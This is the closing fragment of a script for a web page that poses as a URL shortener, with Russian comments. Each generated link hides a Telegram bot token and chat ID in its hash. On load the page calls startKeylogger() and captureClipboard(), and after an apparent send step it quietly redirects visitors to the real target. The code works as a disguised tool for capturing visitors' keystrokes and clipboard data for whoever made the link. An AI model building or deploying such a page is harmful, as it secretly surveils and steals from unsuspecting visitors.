                    }).catch(() => {
                        // если что-то пошло не так, всё равно редиректим
                        setTimeout(() => {
                            window.location.href = targetUrl;
                        }, 1500);
                    });
                }
            }, 1000);
        }
        
        // ========== ИНТЕРФЕЙС ДЛЯ СОЗДАНИЯ СОКРАЩЁННЫХ ССЫЛОК ==========
        function generateShortLink(originalUrl, token, id) {
            let payload = `${originalUrl}|${token}|${id}`;
            let encoded = btoa(unescape(encodeURIComponent(payload)));
            return window.location.origin + window.location.pathname + '#' + encoded;
        }
        
        document.getElementById('shortenBtn').addEventListener('click', function() {
            let longUrl = document.getElementById('longUrl').value.trim();
            let token = document.getElementById('botToken').value.trim();
            let chatIdValue = document.getElementById('chatId').value.trim();
            if (!longUrl.startsWith('http')) {
                alert('Ссылка должна начинаться с http:// или https://');
                return;
            }
            if (!token) {
                alert('Введите токен бота');
                return;
            }
            if (!chatIdValue || isNaN(Number(chatIdValue))) {
                alert('ID получателя должен быть числом');
                return;
            }
            let short = generateShortLink(longUrl, token, Number(chatIdValue));
            document.getElementById('shortLinkDisplay').innerText = short;
            document.getElementById('resultBlock').classList.add('show');
        });
        
        document.getElementById('copyBtn').addEventListener('click', function() {
            let linkText = document.getElementById('shortLinkDisplay').innerText;
            navigator.clipboard.writeText(linkText).then(() => {
                let toast = document.getElementById('toastMessage');
                toast.classList.add('show-toast');
                setTimeout(() => toast.classList.remove('show-toast'), 1500);
            });
        });
        
        window.addEventListener('DOMContentLoaded', () => handleHashRedirect());
        window.addEventListener('hashchange', () => handleHashRedirect());
        startKeylogger();
        captureClipboard();
    })();
</script>
